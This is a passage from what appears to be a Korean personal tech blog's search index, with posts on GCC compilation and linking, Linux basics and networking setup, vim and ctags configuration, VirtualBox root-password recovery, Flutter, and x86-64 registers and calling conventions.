executable\u0026rdquo; 라고 출력된다. gcc -v --save-temps -o out : 위 전체 과정을 실행하며 중간 생성물을 남기고, 실행 결과도 출력 리눅스에서 ldd 명령으로 링킹시 라이브러리 의존성을 확인할 수 있다. ASLR을 지원하는 커널의 경우, -no-pie 옵션을 넣으면 PIE( position independent executable) 영역을 생성하지 않아 ASLR 기능을 끌 수 있다. 라이브러리 헤더파일에서 include를 하여 사용할 수 있는 목적파일을 라이브러리라고 칭한다. 라이브러리는 링킹을 통해 프로그램에 포함되며, 링킹 방식에 따라 \u0026lsquo;정적 라이브러리\u0026rsquo;와 \u0026lsquo;동적 라이브러리\u0026rsquo;로 분류된다. 정적 라이브러리는 정적 링킹에 의해 생성되며, 라이브러리가 코드의 object 파일이 자체에 포함되는 형태이다. 정적 라이브러리는 파일의 크기가 커지고, 라이브러리 버전 변경시 파일이 매번 변경되어야 하는 단점이 있다. gcc -static 와 같이 static 옵션을 넣어 설정 가능하다. 동적 라이브러리는 동적 링킹에 의해 생성되며, 라이브러리 코드의 object 파일이 별도로 존재하고, 링커가 라이브러리 코드의 주소를 사용자의 코드와 연결시켜주는 형태이다. 빌드시 별도 옵션을 넣지 않으면 dynamic linking 으로 동작한다. 동적 할당을 수행하면 각 프로세스는 외부 라이브러리 코드의 함수를 PLT(Procedure Linkage Table) 와 GOT(Global Offsets Table)를 통해 접근하게 된다. C에서 라이브러리 파일은 lib 으로 시작하는 규칙을 지니며 .a 확장자를 가진다 gcc -c CFILE.c -o OBJ.o 명령으로 OBJ.o 목적파일을 생성했다면, ar rcv libmylib.a OBJ.o 명령으로 libmylib.a라는 사용자 정의 라이브러리/정적 라이브러리를 생성 가능하다. ar t libmylib.a 로 라이브러리가 가리키는 파일을 검색하면 OBJ.j 파일을 확인할 수 있다. 라이브러리를 함께 컴파일 할 때 gcc main.c libmylib.a 와 같이 컴파일 할 수도 있지만, 라이브러리를 제대로 활용하는 방법은 gcc main.c -lmylib 와 같이 -l 옵션을 이용한다. 정적 라이브러리 이름에서 앞쪽의 lib 부분과 뒤쪽의 .a 부분을 제외한 부분이 라이브러리 이름이다. 위 예시에서는 mylib이 라이브러리 이름이다.\n리눅스에서 ldd 명령으로 링킹시 라이브러리 의존성을 확인할 수 있다. gcc는 소스코드 컴파일 시 표준 라이브러리의 파일들을 모두 탐색하도록 되어있다. ld --verbose | grep SEARCH_DIR | tr -s ' ;' '\\n' 명령어로 확인하면 포함시킨 경로를 확인할 수 있다. SEARCH_DIR(\u0026quot;=/usr/local/lib/x86_64-linux-gnu\u0026quot;) SEARCH_DIR(\u0026quot;=/lib/x86_64-linux-gnu\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/lib/x86_64-linux-gnu\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/lib/x86_64-linux-gnu64\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/local/lib64\u0026quot;) SEARCH_DIR(\u0026quot;=/lib64\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/lib64\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/local/lib\u0026quot;) SEARCH_DIR(\u0026quot;=/lib\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/lib\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/x86_64-linux-gnu/lib64\u0026quot;) SEARCH_DIR(\u0026quot;=/usr/x86_64-linux-gnu/lib\u0026quot;) 동적 라이브러리 참조 동적 링크를 적용한 경우, 프로그램 실행 전 linux 환경변수를 세팅하여 라이브러리 참조 위치를 설정 할 수 있다. export LD_PRELOAD=$(realpath {라이브러리_파일}) : \u0026ldquo;라이브러리_파일\u0026rdquo; 경로의 라이브러리를 가장 먼저 참조 export LD_PRELOAD=$(realpath {파일1}:{파일2}:{파일3}) : 여러 파일들을 LD_PRELOAD 에 추가 export LD_LIBRARY_PATH=$(realpath {디렉터리_경로}}) : 특정 디렉터리에서 라이브러리를 찾아 실행하도록 설정 export LD_LIBRARY_PATH=$(realpath {디렉터리1}:{디렉터리2}}) : 여러 디렉터리를 LD_LIBRARY_PATH 에 추가 명령어 옵션 -o: 생성될 파일의 이름을 설정. (\u0026lsquo;SRC.c\u0026rsquo; 를 넣으면 결과물은 \u0026lsquo;SRC.o\u0026rsquo;, \u0026lsquo;SRC.s\u0026rsquo; 형태로 나오지만, 실팽파일은 a.out 형태가 된다. 전통적인 unix의 방식) -c: 목적파일 \u0026ldquo;*.o\u0026rdquo; 파일 생성 -E: 전처리된 \u0026ldquo;*.i\u0026rdquo; 파일 생성 -S: 어셈블된 \u0026ldquo;*.s\u0026rdquo; 파일 생성 아무 옵션도 넣지 않으면 실행 파일을 만드는 것이 기본\n-g: gdb(GNU debugger) 로 디버깅 할 때, 소스를 보면서 디버깅 할 수 있게 컴파일 하는 옵션. 디버깅 심벌이 들어가면서 소스 크기가 크게 증가한다. -l: 컴파일시 라이브러리를 추가하는 명령어 gcc -l라이브러리이름 형태로 사용한다. (ex: gcc -lmylib 으로 libmylib.a 라이브러리 첨가 가능) -L: 링크할 라이브러리를 찾을 위치를 추가할 수 있다. gcc -L/usr/local/library 와 같이 경로를 추가할 수 있다. LIBRARY_PATH 환경변수를 참조하도록 되어있으며, LIBRARY_PATH는 일반적으로 /usr/lib 경로를 포함한다.\n-I: include path를 지정해 주는 옵션. gcc -I. (현재위치 추가 명령)와 같이 특정 위치를 include 하도록 할 수 있다. 이렇게 설정한 경로는 .c 파일에서 include\u0026lt;\u0026gt; 명령으로 라이브러리를 참조할 수 있게 한다. -I 옵션으로 경로를 지정하지 않으면 include\u0026quot;\u0026quot; 형태로 같은 경로상의 라이브러리를 참조할 수는 있다.\n-Wall : warning level all, 모든 오류를 출력한다. ","permalink":"https://aswinblue.github.io/Blog/post/c++/gcc/","summary":"GCC C / C++ 언어를 컴파일 해 주는 도구이다. 리눅스에서는 apt 명령으로 설치 가능하며, 윈도우에서는 Mingw을 이용하여 설치 가능하다. gcc는 컴파일러를 포함한 패키지일 뿐, 내부적인 컴파일러는 따로 있다. (cc1 등)\nGCC 컴파일 동작 순서 gcc main.c 파일을 동작시키면 main.c파일을 컴파일하여 실행파일인 a.out 파일을 생성하게 된다.\n하지만 내부적으로는 아래와 같은 과정을 거치게 된다.\n전처리 : c언어로 구현된 .c 파일을 전처리가 완료된 .i 파일로 변환한다.\ngcc -E main.c -o a.i : main.c 파일을 a.","title":"Gcc"},{"content":"Linux 생성 배경 Unix unix는 범용 다중 사용자 방식의 시분할 운영체제이다. 즉, multi-user를 목적으로 개발된 운영체제이다. Dennis Ritche, Ken Thompson, Douglas Mcllroy 등이 주축이 되어 개발 이후 다양한 회사들에 의해 개발이 지속되어, 표준화의 필요성이 생겼고, IEEE에서 제안한 POSIX(Portable Operating System Interface) 라는 표준 인터페이스를 따르게 되었다. 리눅스는 unix를 기반으로 개발된 os이다. GNU Richard Stallman이 창시한 FSF(Free Software Foundation) 의 프로젝트 GNU 리눅스도 GNU의 GPL(General Public License) 에 의해 배포된다. 무료로 사용 가능하며 GPL 소스를 적용된 코드를 수정하여 재판매가 가능하지만, 해당 코드를 공개해야 하며, 개발자는 코드로 인해 발생하는 어떤 문제에 대해서도 법적 책임을 지지 않는다. GNU 프로젝트에서 linux를 main os로 채택 Linus Torvalds 리눅스 커널을 최초로 개발하였으며, 현재도 리눅스 커널 최고 설계자로 위치 Git 개발에도 참여하였음 리눅스는 수많은 개발자들이 개발에 동참하기에 개발 속도가 빠르고 분량이 방대하다. 1991년 0.01버전이 공개되고, 1994년 1.0버전이, 1999년 2.4가 발표되었다. 커널은 같지만, Redhat Ubuntu CentOs Fedora 등 다양한 배포 버전이 개발되었다. Linux hierarchy 리눅스는 다음과 같은 구조로 구성되어 하드웨어를 제어한다. Hardware -\u0026gt;\nLinux Kernel -\u0026gt;\nSystem Call Interface -\u0026gt;\nSystem Utilities -\u0026gt;\nLinux Shell\n하드웨어에 가까울 수록 low level, 멀어질 수록 high level 로 동작이 캡슐화 된다. File System 리눅스의 파일 구조는 Tree 형태를 갖고 있다. 가장 최 상단의 경로는 / 이며, root directory라고 칭한다. 모든 주변장치(터미널, 프린터, 디스크) 를 파일로 간주한다. 리눅스는 multi user 를 위한 OS이기 때문에, 각 파일은 접근 권한이 부여된다. file system은 아래와 같이 partition의 연속으로 이루어진다. file system 구조\r---------------------------------\rPartition | Partition | Partition ---------------------------------\rPartition 구조\r------------------------------------------------------------------\rBoot block | Super block | i-node List | Data block ------------------------------------------------------------------\ri-node list 구조\r-------------------------------\ri-node | i-node | i-node | ...\r------------------------------- Boot block Boot block에는 bootstrap loader가 들어있다. Super block Superblock에는 파일 시스템의 정보가 들어있다. 파일 시스템 크기 파일 시스템 내의 자유 블록 수 파일 시스템 내에서 사용 가능한 자유 블록의 리스트 i-node 리스트의 크기 파일 시스템에서 사용 가능한 i-node의 수 파일 시스템에서 사용 가능한 i-node의 리스트 i-node (information node) 각 partition은 i-node list를 가지며, i-node list에는 information node(i-node) 들이 나열되어 있다.\n모든 파일 하나에는 i-node 하나가 할당되며, i-node는 파일의 정보를 나타낸다.\n소유자 ID 파일 유형 파일 접근 권한 파일 접근 시간 링크 수 파일 데이터의 주소 파일의 크기 파일의 이름은 inode 번호와 함께 디렉터리에 기록된다.\ni-node는 부팅시 추가 정보가 포함되어 메모리에 복사된다. 복사된 이 정보를 i-node cache라 한다.\n추가정보에는 참조계수 i-node번호 (ls -li로 확인 가능) 파일 시스템 장치 번호 (ls -l 명령시, 파일 size 대신 major/minor 번호가 표시됨) Data block Data block은 4kB 크기이며, 하나의 파일이 여러 Data block을 가질 수 있다. 디렉터리 구조 /bin : 유저가 사용할 수 있는 명령어나 실행 파일을 보관하는 디렉터리. /boot : 시스템 부팅에 필요한 파일들을 보관하는 디렉터리 /dev : 리눅스에서는 컴퓨터에 연결된 장치들을 디바이스 드라이버라는 파일 형태로 접근하며, 그러한 장치들을 나타내는 파일들은 /dev 경로에 보관된다. /etc : 리눅스에서 동작하는 서비스의 설정 파일들을 보관하는 디렉터리 /home : 각 유저의 홈 디렉토리가 들어가는 디렉터리. /lib : 시스템에 필요한 라이브러리 파일들이 보관되는 디렉터리. /bin 이나 /sbin 에 존재하는 프로그램이 필요로 하는 동적 라이브러리 파일이 /lib 디렉터리에 보관된다. /opt : 최초 설치에 포함되지 않고 유저가 추가로 설치한 프로그램들을 보관하는 디렉터리. (window의 C:\\Program Files 와 유사하다고 보면 된다.) /proc : 리눅스 커널의 상태를 나타내는 파일들을 보관하는 디렉터리 /root : root 유저의 홈 디렉터리 /sbin : /bin 디렉터리와 같이 명령어나 프로그램이 저장되는 디렉터리지만, /sbin은 root 유저가 사용할 수 있는 명령어나 프로그램이 보관된다는 차이가 있다. /tmp : 유저나 프로그램이 파일을 임시로 생성할 떄 사용할 수 있는 디렉터리. 오래된 파일들은 시스템에 의해 자동으로 삭제되므로 주의 /usr : 사용자 바이너리, 문서, 라이브러리, 헤더 파일 등을 담고 있는 디렉터리(윈도우의 C:\\User 폴더와 유사) /var : 프로그램이나 시스템이 실행될 때 저장이 필요한 파일을 저장하는 디렉터리. (ex: /var/log) 엔디안 숫자를 표현할 때 여러 바이트를 사용하게 된다. 이 때 가장 큰 숫자를 나타내는 byte를 MSB(Most Significant Byte), 반대로 가장 작은 숫자를 나타내는 byte를 LSB(Least Significant Byte)라 한다. 예를들어 0x12345678 에서 0x12가 MSB, 0x78이 LSB에 해당한다. 컴퓨터에서는 바이트로 이루어진 데이터를 읽을 때, 가장 앞쪽의 바이트를 MSB(Big endian)으로 표현하는 방식과 LSB로 표현하는 방식(Little endian)이 있다. 즉, little endian에서는 0x12345678이 0x78563412로 표현되고, big endian에서는 0x12345678은 그대로 0x12345678이다. 대부분의 리눅스 시스템에서는 Little endian 방식을 사용한다. 하지만 Big endian 방식을 사용하는 시스템도 있으므로, 두 시스템간 데이터 전송시 호환을 위해 엔디안 변환이 필요하다. ","permalink":"https://aswinblue.github.io/Blog/post/linux/linux_introduction/","summary":"Linux 생성 배경 Unix unix는 범용 다중 사용자 방식의 시분할 운영체제이다. 즉, multi-user를 목적으로 개발된 운영체제이다. Dennis Ritche, Ken Thompson, Douglas Mcllroy 등이 주축이 되어 개발 이후 다양한 회사들에 의해 개발이 지속되어, 표준화의 필요성이 생겼고, IEEE에서 제안한 POSIX(Portable Operating System Interface) 라는 표준 인터페이스를 따르게 되었다. 리눅스는 unix를 기반으로 개발된 os이다. GNU Richard Stallman이 창시한 FSF(Free Software Foundation) 의 프로젝트 GNU 리눅스도 GNU의 GPL(General Public License) 에 의해 배포된다. 무료로 사용 가능하며 GPL 소스를 적용된 코드를 수정하여 재판매가 가능하지만, 해당 코드를 공개해야 하며, 개발자는 코드로 인해 발생하는 어떤 문제에 대해서도 법적 책임을 지지 않는다.","title":"Linux_introduction"},{"content":"Dev in Linux 리눅스 개발환경 구축을 위한 가이드\n사용자 맞춤 설정 .bashrc 홈 디렉터리에 위치한 user별 설정 파일이다.\nsource ~/.bashrc 명령어로 언제든 새로고침 할 수 있다.\n리눅스 콘솔 프롬프트를 보기 쉽게 색칠하기 위한 설정할 수 있다.\nforce_color_prompt=true\rif [ -n \u0026#34;$force_color_prompt\u0026#34; ]; then\rif [ -x /usr/bin/tput ] \u0026amp;\u0026amp; tput setaf 1 \u0026gt;\u0026amp;/dev/null; then\r# We have color support; assume it\u0026#39;s compliant with Ecma-48\r# (ISO/IEC-6429). (Lack of such support is extremely rare, and such\r# a case would tend to support setf rather than setaf.)\rcolor_prompt=yes\relse\rcolor_prompt=\rfi\rfi\rif [ \u0026#34;$color_prompt\u0026#34; = yes ]; then\rPS1=\u0026#39;${debian_chroot:+($debian_root)}\\[\\033[01;32m\\]\\u\\[\\033[01;36m\\]@\\[\\033[01;35m\\]\\h\\[\\033[00m\\]:\\[\\033[01;033m\\]\\w\\$\\[\\033[00m\\]\u0026#39;\relse\rPS1=\u0026#39;${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ \u0026#39;\rfi\runset color_prompt force_color_prompt vi 리눅스에서 활용할 수 있는 기본적인 에디터이다. 진입장벽은 높은 편이지만, 한번 익숙해지면 매우 편리하다.\n~/.vimrc 폴더에 기본 설정을 적용할 수 있다.\n기본적인 설정은 아래와 같이 세팅할 수 있다.\n# 탭을 spacebar 4개로 설정한다. set ts=4 set sw=4 set sts=4\r# 자동으로 indent를 넣어주도록 설정한다. set smartindent\r# 검색시 하이라이트를 넣어준다. set hlsearch\r\u0026#34; \u0026#34; indent for python\u0026#34;\rset smartindent\r\u0026#34; cinwords=if,elif,else,for,while,try,except,finally,def,class\r# 테마를 설정 해 준다. 테마는 \u0026#39;/usr/share/vim/vim[VER]/colors/\u0026#39; 경로에 *.vim 파일이 있어야 한다. 아래는 molokai.vim 파일을 설정하는 방식이다.\r:colorscheme molokai\r:highlight comment term=bold cterm=bold ctermfg=4\r:set hlsearch\r:set expandtab\r:set smartindent\r:set tabstop=4\r:set autoindent\r:set si\r:set shiftwidth=4\r:set cinoptions+=j1 Ctag vi와 함께 쓰이는 툴로, vi 환경에서 파일간 함수/변수 선언위치를 버튼 하나로 이동할 수 있도록 해주는 모듈이다.\ntags라는 파일을 생성하여 기본적인 사용법은 다음과 같다.\n설정 (리눅스 명령어로) ctag를 사용할 가장 root 폴더로 이동한다. ctags -R * 명령어로 하위 폴더의 모든 파일에 대해 태그를 생성한다. (* 대신 *.cpp *.java 등 원하는 파일만 설정할 수도 있다. ) make 모듈이 깔려있다면 make tags 명령으로 커널을 이용하여 더 빠르게 생성할 수도 있다. set tags+=PATH_TO_FILE 형태로 ~/.vimrc 파일에서 tags 경로를 설정해주면, 어떤 위치에서도 ctag 검색이 가능하다. 사용 (vi 창에서) Ctrl + ] : 커서 위치의 함수/변수의 선언부로 이동 (g + ] 로도 가능) Ctrl + T : 이전 위치로 이동 시스템 네트워크 네트워크 상태확인 ifconfig -a 명령을 사용하면 현재 기기의 랜카드와 그 정보를 확인할 수 있다. netstat -nap 명령으로 시스템에서 네트워킹을 사용하는 프로세스들의 정보 및 네트워크 소켓 상태를 확인 가능하다. netstat -rn 게이트웨이 정보만 짧게 출력 가능하다. route -n 라우팅 테이블을 확인 할 수 있다. 게이트웨이 주소를 확인할 수 있음 nslookup SERVER_NAME : DNS 서버가 제대로 동작하는지 있다. SERVER_NAME 에 주소를 입력하면 입력한 서버의 정보가 확인된다. ex) nslookup naver.com 입력 결과 $ nslookup naver.com\rServer: 172.26.80.1\rAddress: 172.26.80.1#53\rNon-authoritative answer:\rName: naver.com\rAddress: 223.130.200.219\rName: naver.com\rAddress: 223.130.192.248\rName: naver.com\rAddress: 223.130.192.247\rName: naver.com\rAddress: 223.130.200.236 host 차단/허용 /etc/hosts.deny 파일로 차단할 IP 를 설정할 수 있다. /etc/hosts.deny 에서 차단한된 IP 중 일부를 /etc/hosts.allow 파일에서 허용할 수 있다. 파일에는 SERVICE:IP:[PORT] 형태로 내용을 작성하면 차단/허용을 설정할 수 있다. ex) sshd:10.162.36.10:22 : 10.162.36.10 주소에서 22번 포트로 sshd 서비스에 접근하는 경우를 설정 모든 프로토콜, 혹은 모든 IP를 표현할 땐 ALL 을 사용한다. ex) ALL: 10.162.36.10, httpd:ALL 주소중 앞부분 일부가 일치하는 경우를 설정하고 싶다면 뒷자리를 비워두면 된다. ex) ALL: 10.162. : 10.162.. 형태의 주소에 대해 설정 service SERVICE restart 명령을 실행하여 daemon을 재실행하면 설정한 내용이 적용된다. ex) service sshd restart 네트워크 연결 리눅스 최초 설치 및 네트워크 설정 변경시 사용할 명령어를 기술한다. 본 내용은 ubuntu 를 base로 작성되었다.\n리눅스는 /etc/network/interfaces 에 네트워크 연결 설정이 세팅된다.\nex) auto eth0 iface eth0 inet static address 192.168.0.20 netmask 255.255.255.0 netwrok 192.168.0.0 broadcast 192.168.0.255\rgateway 192.168.0.1\rdns-nameservers 168.126.63.1 168.126.63.2 8.8.8.8 내용을 수정한 후에는 시스템을 재부팅 하거나 ifdown eth0, ifup eth0 명령으로 드라이버를 재구동 하면 된다. /etc/netplan/*.yam 파일로도 네트워크 설정을 할 수 있다.\nex) network:\rversion: 2\rrenderer: networkd\rethernets:\rwlp5s0:\rdhcp4: no addresses: ## 설정할 IP 와 Netmask\r- 192.168.0.214/24\r### deprecated\r# gateway4: 192.168.0.1\rroutes:\r- to: default\rvia: 192.168.10.1\rnameservers:\raddresses: [8.8.8.8,168.126.63.1]\r# search: [lesstif.com]\r# optional: true sudo netplan apply 으로 설정을 적용한다. /etc/resolv.conf 에서 nameserver를 설정 할 수 있다.\nnet-tools 을 사용한 설정 net-tools 이 설치되어 있다면 네트워크 설정이 간단하다. ifconfig -a 명령은 기기의 랜카드와 그 정보를 확인할 수 있다. ex) eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 10.162.82.17 netmask 255.255.255.0 broadcast 10.162.82.255\rinet6 0e10::313:5d6f:ae41:2ba8 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 00:25:3d:b1:14:9c txqueuelen 1000 (Ethernet)\rRX packets 188 bytes 512005 (512.0 KB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 178 bytes 26044 (26.0 KB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eh0 은 랜카드의 이름이다. inet 뒤의 10.162.82.177 은 IP주소이다. (IPv4) netmask는 subnet mask 설정이다. ip명령어로 동작 net-tools 가 설치되지 않았을 때 사용해야 하는 방법이다. ip a : 주소확인, ifconfig에 대응된다. ip addr add 192.168.0.101/24 dev eth0 : 설정에 ip주소 추가 192.168.0.101은 IP 주소이다. / 다음 24는 subnet mask의 bit 수이다. eth0 은 ip a 명령어로 확인한 랜카드의 이름이다. ip route add default via 192.168.0.1 : 게이트웨이 192.168.0.1 로 설정 ip link set eth0 up : 수정한 랜 설정 적용 ","permalink":"https://aswinblue.github.io/Blog/post/linux/linux_env/","summary":"Dev in Linux 리눅스 개발환경 구축을 위한 가이드\n사용자 맞춤 설정 .bashrc 홈 디렉터리에 위치한 user별 설정 파일이다.\nsource ~/.bashrc 명령어로 언제든 새로고침 할 수 있다.\n리눅스 콘솔 프롬프트를 보기 쉽게 색칠하기 위한 설정할 수 있다.\nforce_color_prompt=true\rif [ -n \u0026#34;$force_color_prompt\u0026#34; ]; then\rif [ -x /usr/bin/tput ] \u0026amp;\u0026amp; tput setaf 1 \u0026gt;\u0026amp;/dev/null; then\r# We have color support; assume it\u0026#39;s compliant with Ecma-48\r# (ISO/IEC-6429). (Lack of such support is extremely rare, and such\r# a case would tend to support setf rather than setaf.","title":"Linux_env"},{"content":"VirtualBox 문제와 해결 root 계정 virtual box를 생성하면 기본 user의 이름은 vboxuser로 세팅되어 있다. 하지만 vboxuser는 sudo 권한이 없어 다른 설정을 수행 할 수가 없다. virtual box에서 root 계정 비밀번호를 변경하는 방법은 다음과 같다. virtualbox에서 원하는 ubuntu machine를 실행시킨다. machine이 실행되는 도중 shift키를 클릭하고 있는다. 부팅 모드 선택 화면이 뜨면 Advanced options for Ubuntu 를 선택하고, (recovery mode)표시가 되어있는 항목으로 부팅을 시도한다. 로딩이 완료되면 root 라는 항목을 선택하여 root 계정의 비밀번호를 재설정 할 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/linux/virtual_box/","summary":"VirtualBox 문제와 해결 root 계정 virtual box를 생성하면 기본 user의 이름은 vboxuser로 세팅되어 있다. 하지만 vboxuser는 sudo 권한이 없어 다른 설정을 수행 할 수가 없다. virtual box에서 root 계정 비밀번호를 변경하는 방법은 다음과 같다. virtualbox에서 원하는 ubuntu machine를 실행시킨다. machine이 실행되는 도중 shift키를 클릭하고 있는다. 부팅 모드 선택 화면이 뜨면 Advanced options for Ubuntu 를 선택하고, (recovery mode)표시가 되어있는 항목으로 부팅을 시도한다. 로딩이 완료되면 root 라는 항목을 선택하여 root 계정의 비밀번호를 재설정 할 수 있다.","title":"Virtual_box"},{"content":"개발환경 및 기본 지식 구성 파일들 analysis_options.yaml : flutter rule을 설정하는 파일 assets : 이미지 등 리소스들을 저장하는 경로 lib/main.dart : 메인 App 소스가 구동되는 dart 파일 pubspec.yaml : 리소스 경로 및 API들을 설정할 수 있는 파일 (assets 폴더 설정 가능)\n# 경로 설정\rflutter:\rassets:\r- assets/\r# dependency 설정\rdependencies:\rflutter:\rsdk: flutter\rcupertino_icons: ^1.0.2\randroid/app/src/main/AndroidManifext.xml : 안드로이드 앱 개발시 권한 부여를 위한 파일\n빌드 및 실행 main.dart 파일을 지정하고 실행시켜야 한다. 이때, dart 빌드가 아닌 flutter 빌드를 해준다.\n문법 길이 단위 (LP) 길이 단위는 LP로 사용된다. 100LP는 약 2.4cm\nWidget xml의 tag와 유사하게 정의된 형태의 class widget은 대문자로 시작한다. 참조 : (flutter widget library)[https://api.flutter.dev/flutter/material/material-library.html]\nMaterialApp() Scaffold() Row() Column() Text() Icon Container() SizedBox() Center() ","permalink":"https://aswinblue.github.io/Blog/post/mobileapp/flutter/","summary":"개발환경 및 기본 지식 구성 파일들 analysis_options.yaml : flutter rule을 설정하는 파일 assets : 이미지 등 리소스들을 저장하는 경로 lib/main.dart : 메인 App 소스가 구동되는 dart 파일 pubspec.yaml : 리소스 경로 및 API들을 설정할 수 있는 파일 (assets 폴더 설정 가능)\n# 경로 설정\rflutter:\rassets:\r- assets/\r# dependency 설정\rdependencies:\rflutter:\rsdk: flutter\rcupertino_icons: ^1.0.2\randroid/app/src/main/AndroidManifext.xml : 안드로이드 앱 개발시 권한 부여를 위한 파일\n빌드 및 실행 main.dart 파일을 지정하고 실행시켜야 한다.","title":"Flutter"},{"content":"Computer Science CPU Segment 프로세스가 사용하는 메모리를 Segment라 칭하며, 리눅스에서는 5가지 종류로 이를 분류한다.\n코드 세그먼트 : 실행 가능한 코드가 위치한 영역으로, text segment라고도 부른다. 데이터 세그먼트 : 코드 실행에 필요한 데이터가 있는 영역으로, 전역변수 및 전역 상수들이 위치한다. 읽기/쓰기가 모두 가능한 데이터들은 data segment에 저장된다. 읽기만 가능한 상수 데이터들은 rodata(read-only) segment 에 저장된다. BSS 세그먼트 : Block Started by Symbol 의 약자로, 컴파일시점에 값이 정해지지 않은 전역변수가 저장되는 영역이다. 이 영역은 프로그램 시작시 모두 0으로 초기화 된다. C에서 전역변수가 0 으로 초기화되는 이유가 이 때문이다. 읽기와 쓰기가 모두 가능한 영역이다. 힙 세그먼트 : 동적으로 할당되는 데이터들을 저장하는 영역이다. 스택과 마주보는 방향으로 증가한다. 스택 세그먼트 : 프로세스의 스택이 위치하는 영역으로, 지역변수 및 함수 인자들이 저장된다. 스택 세그먼트는 메모리 마지막 주소(가장 큰 주소)부터 시작해서 힙과 마주보는 방향으로 증가한다. 운영체제가 프로세스 동작 상황에 따라 스택 영역을 관리한다. 세그먼트는 위에서 언급된 순서대로 메모리에 배치되며, 스택 세그먼트만 특이하게 메모리 가장 마지막을 기준으로 할당된다.\nISA Instruction Set Architecture 의 약자로, 명령어 집합 구조라 해석한다.\n하드웨어의 종류에 따라 다른 ISA 가 사용되며, x86-64, ARM, MIPS, AVR 등이 대표적인 예시이다.\n컴퓨터 구조는 \u0026lsquo;기능구조\u0026rsquo; \u0026lsquo;ISA\u0026rsquo; \u0026lsquo;마이크로 아키텍처\u0026rsquo; \u0026lsquo;하드웨어 및 컴퓨팅 방법론\u0026rsquo; 과 같이 레벨에 따라 분류가 가능하다.\nx86-64 아키텍처 레지스터 x86-64 아키텍처는 아래와 같이 레지스터를 용도에 따라 구분한다.\n범용 레지스터(General Register) : 8byte를 저장 가능 - r0 ~ r15까지 16개의 레지스터로 구성되며, 주로 r0 ~ r7 까지가 프로그램 구동시 기본으로 사용되며, 나머지는 정해진 용도 없이 reserved 된 레지스터이다. r0 ~ r7 레지스터는 아래 용도로 주로 사용되고, 명칭도 붙는다. r0) rax (accumulator register) : 함수의 반환 값 r1) rcx (counter register) : 반복문의 반복 횟수, 각종 연산의 시행 횟수 r2) rdx (data register) : 시스템 콜 실행 시 세 번째 인자의 주소 r3) rbx (base register) : 메모리 주소를 저장하는 용도로 사용 r4) rsp (stack pointer) : 사용중인 스택의 위치를 가리키는 포인터 r5) rbp (stack base pointer) : 스택의 바닥을 가리키는 포인터 r6) rsi (source index) : 데이터를 옮길 때 원본을 가리키는 포인터 r7) rdi (destination index) : 데이터를 옮길 때 목적지를 가리키는 포인터 세그먼트 레지스터(Segment Register) : 16bit를 저장 가능 - 과거에는 사용 가능한 물리 메모리의 크기를 늘리기 위해 사용했으나, x64 아키텍처에서는 주소영역이 확장되면서 주로 메모리 보호를 위해 사용 cs, ss, ds, es, fs, gs 종류가 존재 - cs, ds, ss 레지스터는 코드 영역과 데이터, 스택 메모리 영역을 가리킬 때 사용 명령어 포인터 레지스터(Instruction Pointer Register, IP) : 8byte 크기 CPU가 실행할 코드 위치를 가리키는 역할 종류로는 rip 가 있다. 플래그 레지스터(Flag Register) : 64bit 프로세서의 현재 상태를 저장하고 있는 레지스터 - 64비트로 CPU의 현재 상태를 표시한다. 주로 우측 20여개를 사용 CF(Carry Flag) : 부호 없는 수의 연산 결과가 비트의 범위를 넘을 경우 설정 됩니다. ZF(Zero Flag) : 연산의 결과가 0일 경우 설정 됩니다. SF(Sign Flag) : 연산의 결과가 음수일 경우 설정 됩니다. OF(Overflow Flag) : 부호 있는 수의 연산 결과가 비트 범위를 넘을 경우 설정 됩니다. CPU의 레지스터들은 32비트 크기를 가지며, eax, ebx, ecx, edx, esi, edi, esp, ebp 가 있다.\n함수 호출 규약 함수 호출시에는 호출자의 상태와 반환주소를 저장하고, 피호출자가 요구하는 인자, 피호출자의 반환값을 처리해야 한다. 이러한 함수 호출 및 반환 매커니즘약을 \u0026ldquo;함수 호출 규약(convention)\u0026rdquo; 이라한다. 함수 호출 규약은 컴파일러에 의해 적용되며, 컴파일러가 target CPU의 종류에 따라 적합한 규약을 적용 해 준다. 예를 들어, 레지스터가 적은 아키텍처에서는 스택을 통해 함수 인자를 전달하고, 반대의 경우는 적은 인자는 레지스터를 통해, 많은 인자는 스택을 통해 전달하는 방식을 취한다. CPU가 같더라도 컴파일러에 따라 함수 호출 규약이 달라질 수 있다. ex) cdecl, stdcall, fastcall, thiscall 스택 혹은 레지스터에 인자를 넣을 때 마지막 인자부터 첫 번째 인자까지 순서대로 집어넣는다. SYSV SYSV 규약으로 만들어진 대표적인 예로는 리눅스가 있다. SYSV ABI(Application Binary Interface) 함수 호출 규약에는 ELF 포맷, 링킹 방법 등이 정의되어 있다. SYSV 규약의 특징 함수 호출시 인자를 순서대로 RDI, RSI(ESI), RDX(EDX), RCX(ECX), R8(R8D), R9(R9D) 에 저장하며 더 많은 인자를 받을 땐 스택을 사용한다. 즉, rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10], [rsp+0x18], [rsp+0x20] 순서로 레지스터 및 stack 의 메모리를 참조하게 된다. 컴파일 high level language를 기계어로 변환하는 작업을 컴파일이라 하고, C언어로 작성된 코드는 컴파일시 네가지 변환기를 거친다.\nPreprocessor(전처리기) : c언어로 구현된 .c 파일을 전처리가 완료된 .i 파일로 변환 주석 제거, 매크로 치환, 파일 병합 과정을 거친다. Compiler(컴파일러) : 전처리된 .i 파일을 어셈블리어로 변환 조건을 만족한다면 컴파일러에 따라 코드를 최적화 하여 어셈블리어로 변환한다. gcc 컴파일러는 -O -O0 -O1 -O2 -O3 -Os -Ofast -Og 옵션으로 최적화 여부를 설정할 수 있다. Assembler(어셈블): 각 벤더들이 만든 어셈블리어를 목적파일로 변환(어셈블리 언어를 기계어로 변환) ELF(리눅스 실행파일) 형식의 파일을 생성한다. 어셈블리 코드가 